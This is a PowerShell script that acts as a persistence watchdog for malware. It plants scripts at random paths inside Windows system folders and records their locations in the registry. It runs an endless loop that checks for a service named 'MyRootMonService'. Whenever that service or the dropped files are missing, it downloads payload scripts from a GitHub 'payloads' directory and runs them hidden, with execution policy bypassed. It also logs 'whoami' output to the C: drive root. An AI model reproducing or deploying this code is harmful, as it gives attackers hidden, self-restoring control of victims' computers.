param(
    [string]$rootPath,
    [string]$basePath
)

$paths = @(
    "$env:windir\system32\config\systemprofile\AppData\Local",
    "$env:windir\System32\WindowsPowerShell\v1.0\Modules",
    "$env:windir\System32\drivers\etc",
    "$env:windir\System32\LogFiles\WMI"
)
Start-Process powershell.exe -ArgumentList "-Command `"whoami >> C:\whoami.txt`""
$serviceName = "MyRootMonService"
$propertyName = "rootMon"
$regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$serviceName"
$issetup = $false

$initServiceRootmonPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
$initServiceRootmonPath = "$initServiceRootmonPath\init_service_rootmon.ps1"
$rootMonScript = ""

$item = Get-ItemProperty -Path "$basePath" -Name $propertyName -ErrorAction SilentlyContinue
if(-not($item)){
    $rootMonScript = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
    $rootMonScript = "$rootMonScript\root_mon.ps1" 
    Set-ItemProperty -Path "$basePath" -Name $propertyName -Value $rootMonScript -Force | Out-Null
    $issetup = $true
}

else{
    $rootMonScript = $item.$propertyName
    $issetup = $false
}


if(($rootPath -eq $null) -or ($rootPath -eq "")){
    $rootPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
    $rootPath = "$rootPath\root.ps1"
}

function Get-ServiceReg{
    param([string]$path)
    $c = Get-Item -Path $path -ErrorAction SilentlyContinue
    if(-not($c)){
        return $true
    }
    return $false
}

function Get-ServiceName{
    param([string]$name)
    try {
        $d = Get-Service -Name $name -ErrorAction SilentlyContinue
        if(-not($d)){
            return $true
        }
    }
    catch {
        return $false
    }
    return $false
}


while($true){
    $r = Get-ServiceReg -path $regPath
    $n = Get-ServiceName -name $serviceName

    if(-not(Test-Path -Path $rootMonScript -PathType Leaf)){
        if(-not($issetup)){
            $rootMonScript = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
            $rootMonScript = "$rootMonScript\root_mon.ps1"
            Set-ItemProperty -Path "$basePath" -Name $propertyName -Value $rootMonScript -Force | Out-Null
        }
        iwr -Uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/root_mon.ps1" -OutFile $rootMonScript
        iwr -Uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/init_service_rootmon.ps1" -OutFile $initServiceRootmonPath
        powershell.exe -ep bypass -noP -w hidden $initServiceRootmonPath -rootPath $rootPath -scriptPath $rootMonScript -basePath $basePath
    }
    
    elseif($r -or $n){
        iwr -Uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/init_service_rootmon.ps1" -OutFile $initServiceRootmonPath
        powershell.exe -ep bypass -noP -w hidden $initServiceRootmonPath -rootPath $rootPath -scriptPath $rootMonScript -basePath $basePath
    }
    $issetup = $false
}